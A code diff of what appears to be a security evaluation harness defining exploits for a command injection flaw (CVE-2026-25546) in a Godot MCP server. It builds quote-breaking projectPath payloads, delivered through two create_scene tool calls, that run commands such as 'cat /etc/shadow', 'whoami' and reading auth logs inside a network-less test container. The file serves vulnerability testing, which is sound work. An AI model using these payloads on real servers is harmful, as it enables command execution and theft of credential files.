@@ -1,19 +1,19 @@
 """CVE-2026-25546: @coding-solo/godot-mcp command injection (CWE-78).
 
 executeOperation builds a shell string `"<godot>" --headless --path "<projectPath>" ...` and runs
-it through exec() (a shell). projectPath is wrapped in double quotes but not escaped, so a
+it through exec() (a shell). projectPath is wrapped in double quotes but never escaped, so a
 projectPath that closes the quote injects an arbitrary command (reach: command_execution). 0.1.1
 builds an argument array and calls execFile(godotPath, args), so projectPath reaches Godot as one
 literal argument with no shell.
 
-Every executeOperation handler first checks existsSync(join(projectPath, 'project.godot')), so each
-exploit's projectPath is also a real baked directory carrying project.godot (baked into the image
-by docker/bake_projects.mjs from the same specs), letting the guard pass while the injection still
-fires. The external godot CLI is a benign stub inside the image: it only passes the server's
-`<godot> --version` validation and exits cleanly, so the injected command (appended to the shell
-line by the real server) is what produces output. The flaw lives in the real server code, not the
-stub. One exploit per kept place names the location it reads; the benign call carries no projectPath
-and is never aimed.
+Every executeOperation handler first checks existsSync(join(projectPath, 'project.godot')), so the
+injected projectPath must also be a real directory carrying a project.godot entry. That directory
+is not seeded: each exploit builds it from tool-call arguments. The first create_scene call writes
+a scene under scenePath `<payload>/project.godot/scene.tscn` inside the plain writable project the
+image bakes at /opt/base-project, so the real Godot 4.4.1's make_dir_recursive creates
+`<payload>/project.godot` as a directory; the second call passes projectPath `<base>/<payload>`,
+whose guard now passes, and the quote-break in <payload> fires the command. One exploit per kept
+place names the location it reads; the benign call carries no projectPath and is never aimed.
 """
 
 import re
@@ -21,16 +21,18 @@ from collections.abc import Awaitable, Callable
 
 from evals.cve_environments import command_injection_env
 from evals.cve_grammar import MechanismClass
+from evals.cve_layout import PROJECT
 from evals.cve_places import Places
 from evals.cve_planting import PlantingHost, SymbolicUser
 from evals.cve_targets import CVETarget
 from mcp_auditor.domain.ports import MCPClientPort
 
-WORKDIR = "/app"  # the compiled server is /app/build/index.js; kept coordinates are absolute
+# The plain writable Godot project the first call of every exploit operates on, baked by both
+# images. It carries no payload: the attacker-named directory is written by the exploit call.
+_BASE_PROJECT = "/opt/base-project"
 
-# One (place_id, command) per command_execution-reachable kept place. These are the same specs the
-# image bakes into its injection-carrying project directories (docker/bake_projects.mjs), so the
-# exploit's projectPath and the baked directory name cannot drift.
+# One command per kept catalogue place the command_execution reach covers. The command reads the
+# place its nonce was planted in, and its stdout is captured in the tool response.
 _SPECS: tuple[tuple[str, str], ...] = (
     ("process-account-identity", "whoami"),
     ("etc-shadow", "cat /etc/shadow"),
@@ -59,22 +61,37 @@ _SPECS: tuple[tuple[str, str], ...] = (
     ("auth-log", "cat /var/log/auth.log"),
 )
 
-# Every exploit's projectPath carries the quote-break marker `";`; the benign call carries no
-# arguments, so it is never aimed.
+# Both calls of every exploit carry the quote-break marker `";` (in scenePath for the first, in
+# projectPath for the second); the benign call carries no arguments, so it is never aimed.
 AIM = re.compile(r'";')
 
 
-def _project_path(place_id: str, cmd: str) -> str:
-    return f'/p/{place_id}";{cmd};"'
+# The payload closes the double quote the shell string wraps projectPath in, runs the command, then
+# reopens a quote. Both calls use the same string, so the directory the first call writes is the
+# one the second call's guard checks.
+def _payload(place_id: str, command: str) -> str:
+    return f'{place_id}";{command};"'
 
 
-def _exploit(place_id: str, cmd: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    project_path = _project_path(place_id, cmd)
+def _exploit(place_id: str, command: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    payload = _payload(place_id, command)
 
     async def run(places: Places, client: MCPClientPort) -> None:
         await client.call_tool(
             "create_scene",
-            {"projectPath": project_path, "scenePath": "/p/scene.tscn", "rootNodeType": "Node2D"},
+            {
+                "projectPath": _BASE_PROJECT,
+                "scenePath": f"{payload}/project.godot/scene.tscn",
+                "rootNodeType": "Node2D",
+            },
+        )
+        await client.call_tool(
+            "create_scene",
+            {
+                "projectPath": f"{_BASE_PROJECT}/{payload}",
+                "scenePath": "out.tscn",
+                "rootNodeType": "Node2D",
+            },
         )
 
     run.__name__ = f"exploit_{place_id.replace('-', '_')}"
@@ -97,9 +114,11 @@ TARGET = CVETarget(
     images=("holdout-2026-25546-godot-mcp",),
     server_image="holdout-2026-25546-godot-mcp",
     patched_image="holdout-2026-25546-godot-mcp-patched",
-    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKDIR, has_network=False),
+    planting_host=PlantingHost(
+        user=SymbolicUser.UNPRIVILEGED, working_directory=PROJECT, has_network=False
+    ),
     builder=command_injection_env,
-    exploits=tuple(_exploit(place_id, cmd) for place_id, cmd in _SPECS),
+    exploits=tuple(_exploit(place_id, command) for place_id, command in _SPECS),
     benign=_benign,
     awaited_capability=None,
     note=(
